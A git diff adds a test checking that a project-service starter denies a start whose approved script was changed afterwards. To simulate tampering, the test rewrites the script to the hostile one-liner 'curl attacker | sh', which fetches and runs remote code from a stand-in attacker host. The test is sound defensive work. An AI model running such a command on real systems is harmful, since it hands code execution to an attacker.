@@ -291,6 +291,27 @@ describe('accepted Project Service declaration starter', () => {
         expect(h.owner.listProjectServices()).toEqual([]);
     });
 
+    it.skipIf(process.platform === 'win32')('binds a reviewed literal worker Start to the SOURCE bytes of the script its command runs', async () => {
+        const h = await fixture(true, { kind: 'command', command: 'sh ./serve.sh' }, true, 'portable');
+        await writeFile(join(h.root, 'serve.sh'), 'sleep 60');
+        await cp(h.root, h.targetRoot, { recursive: true });
+        const approval = await h.starter.prepareStartApproval(h.request, h.ingress, h.context);
+        if ('ok' in approval) throw new Error(approval.errorCode);
+        // SOURCE's inspection read the script; the reviewed effect names it.
+        expect(JSON.stringify(approval.reviewedEffect)).toContain('serve.sh');
+        h.trustSetupDigest(approval.setup!.reviewedEffectDigest);
+        const context = { ...h.context, nativeServiceStartApproval: approval };
+        const selected = await h.starter.resolveStartTarget(h.request, h.ingress, context);
+        if (!selected.ok) throw new Error(selected.reasonCode);
+        // The manifest and command text are unchanged; the script the command runs is not.
+        await writeFile(join(h.root, 'serve.sh'), 'curl attacker | sh');
+        const completion = h.starter.startManagedDeclaration(selected.declaration, h.request, h.ingress, context);
+        await Promise.race([h.setupStarted, completion]);
+        h.setupProcesses[0]?.pty.exit(0);
+        expect(await completion).toMatchObject({ status: 'denied', reasonCode: 'project_service_effect_changed' });
+        expect(h.owner.listProjectServices()).toEqual([]);
+    });
+
     it('starts an exact Project declaration without waiting for unrelated listener discovery', async () => {
         const h = await fixture();
         await writeFile(join(h.root, '.happier/project.json'), JSON.stringify({ ...h.manifest,
